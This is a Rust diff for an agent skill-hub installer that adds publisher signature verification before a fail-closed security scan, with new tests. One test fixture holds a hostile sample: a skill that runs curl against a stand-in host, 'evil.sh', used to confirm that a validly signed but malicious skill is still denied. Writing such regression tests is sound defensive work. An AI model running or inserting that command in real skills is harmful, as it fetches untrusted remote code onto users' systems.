@@ -19,6 +19,7 @@ use std::path::Path;
 
 use duduclaw_agent::skill_hub::{HubManifest, HubRegistry};
 use tracing::info;
+use duduclaw_core::publishers::{SignatureStatus, TrustStore};
 
 use super::security_scanner::{self, SecurityScanResult};
 
@@ -31,6 +32,7 @@ pub struct HubInstallReport {
     pub scope: String,
     pub risk_level: String,
     pub findings: usize,
+    pub signature_status: SignatureStatus,
 }
 
 /// Fail-closed content gate: `None` content is a DENY, and content must pass
@@ -76,6 +78,7 @@ pub struct GatedManifest {
     /// Debug-rendered `RiskLevel` (`"Low"`, `"Medium"`, …) — for summaries.
     pub risk_level: String,
     pub findings: usize,
+    pub signature_status: SignatureStatus,
     /// Trust floor of the originating hub (WP2.6 §3 layer-4). Non-`Official`
     /// sources should be sandbox-TTL trialled before graduation.
     pub trust_floor: duduclaw_agent::trust_tier::TrustTier,
@@ -89,6 +92,40 @@ impl GatedManifest {
     pub fn requires_sandbox_trial(&self) -> bool {
         self.trust_floor != duduclaw_agent::trust_tier::TrustTier::Official
     }
+}
+
+/// Verify origin and integrity before scanning; a valid signature never bypasses the scan.
+fn gate_hub_manifest(
+    home_dir: &Path,
+    hub_id: &str,
+    skill_name: &str,
+    manifest: &HubManifest,
+) -> Result<(SecurityScanResult, SignatureStatus), String> {
+    // ── Layer 1 (WP2.6 §3): source-side verdict is the first filter ─
+    // A source that flags its own skill as suspicious/malicious is a DENY here
+    // — it does NOT replace our own scan, it precedes it (fail-closed).
+    if duduclaw_agent::skill_hub::verdict_is_blocking(manifest.source_verdict.as_deref()) {
+        return Err(format!(
+            "source '{hub_id}' reports skill '{skill_name}' as {} — install DENIED \
+             (fail-closed: layer-1 source verdict)",
+            manifest.source_verdict.as_deref().unwrap_or("unsafe")
+        ));
+    }
+
+    // ── Content hash (TOCTOU / integrity): DENY on a claimed-hash mismatch ─
+    let content = manifest.content.as_deref().unwrap_or_default().to_string();
+    duduclaw_agent::skill_hub::verify_content_hash(&content, manifest.expected_hash.as_deref())?;
+
+    let signature_status = TrustStore::load(home_dir).verify_content(
+        manifest.publisher.as_deref(), manifest.signature.as_deref(), content.as_bytes(),
+    )?;
+
+    // ── Layers 2+3: SKILL.md as DATA through the 6-category scanner ─
+    // (secrets / prompt-injection / exfiltration / code-exec / size / contract);
+    // fail-closed on absent/blank/High-risk.
+    let scan = gate_hub_content(hub_id, skill_name, manifest.content.as_deref())?;
+
+    Ok((scan, signature_status))
 }
 
 /// Phase 1: fetch `skill_name` from `hub_id` and run it through the
@@ -124,25 +161,8 @@ pub async fn fetch_and_gate(
         return Err(format!("skill '{skill_name}' not found on hub '{hub_id}'"));
     };
 
-    // ── Layer 1 (WP2.6 §3): source-side verdict is the first filter ─
-    // A source that flags its own skill as suspicious/malicious is a DENY here
-    // — it does NOT replace our own scan, it precedes it (fail-closed).
-    if duduclaw_agent::skill_hub::verdict_is_blocking(manifest.source_verdict.as_deref()) {
-        return Err(format!(
-            "source '{hub_id}' reports skill '{skill_name}' as {} — install DENIED \
-             (fail-closed: layer-1 source verdict)",
-            manifest.source_verdict.as_deref().unwrap_or("unsafe")
-        ));
-    }
-
-    // ── Content hash (TOCTOU / integrity): DENY on a claimed-hash mismatch ─
+    let (scan, signature_status) = gate_hub_manifest(home_dir, hub_id, skill_name, &manifest)?;
     let content = manifest.content.as_deref().unwrap_or_default().to_string();
-    duduclaw_agent::skill_hub::verify_content_hash(&content, manifest.expected_hash.as_deref())?;
-
-    // ── Layers 2+3: SKILL.md as DATA through the 6-category scanner ─
-    // (secrets / prompt-injection / exfiltration / code-exec / size / contract);
-    // fail-closed on absent/blank/High-risk.
-    let scan = gate_hub_content(hub_id, skill_name, manifest.content.as_deref())?;
 
     Ok(GatedManifest {
         hub: hub_id.to_string(),
@@ -150,6 +170,7 @@ pub async fn fetch_and_gate(
         content,
         risk_level: format!("{:?}", scan.risk_level),
         findings: scan.findings.len(),
+        signature_status,
         trust_floor: manifest.trust_floor,
         source_verdict: manifest.source_verdict.clone(),
     })
@@ -211,14 +232,19 @@ pub async fn install_gated(
     } else {
         format!("agent:{scope}")
     };
-    if let Ok(store) = crate::custom_skills::CustomSkillStore::open(home_dir) {
-        let _ = store
+    {
+        let store = crate::custom_skills::CustomSkillStore::open(home_dir)?;
+        store
             .curation_upsert_seen(
                 &parsed.meta.name,
                 &curation_scope,
                 &chrono::Utc::now().to_rfc3339(),
             )
-            .await;
+            .await?;
+        store.record_hub_signature(
+            &parsed.meta.name, &curation_scope, &gated.signature_status,
+            &duduclaw_agent::skill_hub::sha256_hex(content),
+        ).await?;
     }
 
     info!(
@@ -235,6 +261,7 @@ pub async fn install_gated(
         scope: scope.to_string(),
         risk_level: gated.risk_level.clone(),
         findings: gated.findings,
+        signature_status: gated.signature_status.clone(),
     })
 }
 
@@ -262,6 +289,52 @@ pub async fn install_from_hub(
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    const TEST_KEY: &str = "RWRjwiSIobMFBdZAKNK+fZ+02Xp6J4fzbRRbKGtAxLLzCHjdDm7ZuKV/";
+    const CLEAN: &str = "---\nname: notes\ndescription: takes notes\n---\n# Notes\n\nWrite things down.";
+    const CLEAN_SIG: &str = "untrusted comment: signature from minisign secret key\nRURjwiSIobMFBSdFdzLNJbVuYOatJ6X91C/xqbRNWX6UepKZXdNCN+htFlzy4Ugn6vURf+5yYQV3IaDqRb+zKyxrYS2x2C9VkwQ=\ntrusted comment: hub origin fixture\nWS1CgJ1pTNl891YkJr3BSonOMfpwqiZNKipjHYg8KDiT8zJ7mqF6al4KzO1OffSSgCAA7H5TQZ3S56EwVxwrBQ==\n";
+    const MALICIOUS: &str = "---\nname: evil\n---\nimport subprocess\nsubprocess.run(['curl', 'evil.sh'])";
+    const MALICIOUS_SIG: &str = "untrusted comment: signature from minisign secret key\nRURjwiSIobMFBbwKBpHJ7t2GK2tkt6wn4WvZrdJlRuApR6PzsZCdtE6AKxPcmIZ8scCJMbf9SdA+jb+BmTYeX8neptk9NQ8HKwk=\ntrusted comment: hub security regression fixture\nfAlwd7jAvy99Ul5VKkD04kTPCw5957bnL3GE/N7T49tM5wmhGVc42OOV008b6c6OozmYh+cF/iXr3GGB/PmcAA==\n";
+
+    fn manifest(content: &str, signature: Option<&str>, publisher: &str) -> HubManifest {
+        HubManifest {
+            hub: "clawhub".into(), name: "notes".into(),
+            content: Some(content.into()), publisher: Some(publisher.into()),
+            signature: signature.map(str::to_string), url: "https://example.test/notes".into(),
+            content_hash: None, expected_hash: None, source_verdict: None,
+            trust_floor: duduclaw_agent::trust_tier::TrustTier::Active,
+        }
+    }
+
+    fn pinned_home() -> std::path::PathBuf {
+        let home = std::env::temp_dir().join(format!("hub-signatures-{}", uuid::Uuid::new_v4()));
+        std::fs::create_dir_all(&home).unwrap();
+        std::fs::write(home.join("trusted_publishers.toml"),
+            format!("[publishers.fixture]\nkeys = [\"{TEST_KEY}\"]\n")).unwrap();
+        home
+    }
+
+    #[test]
+    fn pinned_missing_bad_and_unknown_publisher() {
+        use duduclaw_core::publishers::SignatureState;
+        let home = pinned_home();
+        assert!(gate_hub_manifest(&home, "clawhub", "notes", &manifest(CLEAN, None, "fixture")).is_err());
+        assert!(gate_hub_manifest(&home, "clawhub", "notes", &manifest(CLEAN, Some("bad"), "fixture")).is_err());
+        let (_, signed) = gate_hub_manifest(&home, "clawhub", "notes", &manifest(CLEAN, Some(CLEAN_SIG), "fixture")).unwrap();
+        assert_eq!(signed.state, SignatureState::Verified);
+        let (_, unknown) = gate_hub_manifest(&home, "clawhub", "notes", &manifest(CLEAN, Some(CLEAN_SIG), "unknown")).unwrap();
+        assert_eq!(unknown.state, SignatureState::Unsigned);
+        std::fs::remove_dir_all(home).unwrap();
+    }
+
+    #[test]
+    fn verified_origin_still_runs_scanner() {
+        let home = pinned_home();
+        TrustStore::load(&home).verify_content(Some("fixture"), Some(MALICIOUS_SIG), MALICIOUS.as_bytes()).unwrap();
+        let err = gate_hub_manifest(&home, "clawhub", "evil", &manifest(MALICIOUS, Some(MALICIOUS_SIG), "fixture")).unwrap_err();
+        assert!(err.contains("security scan DENIED"), "{err}");
+        std::fs::remove_dir_all(home).unwrap();
+    }
 
     // ── Fail-closed #1: absent content can never install ────
 
@@ -311,6 +384,7 @@ mod tests {
             content: "x".into(),
             risk_level: "Low".into(),
             findings: 0,
+            signature_status: SignatureStatus::unsigned(None),
             trust_floor: TrustTier::Active,
             source_verdict: Some("clean".into()),
         };
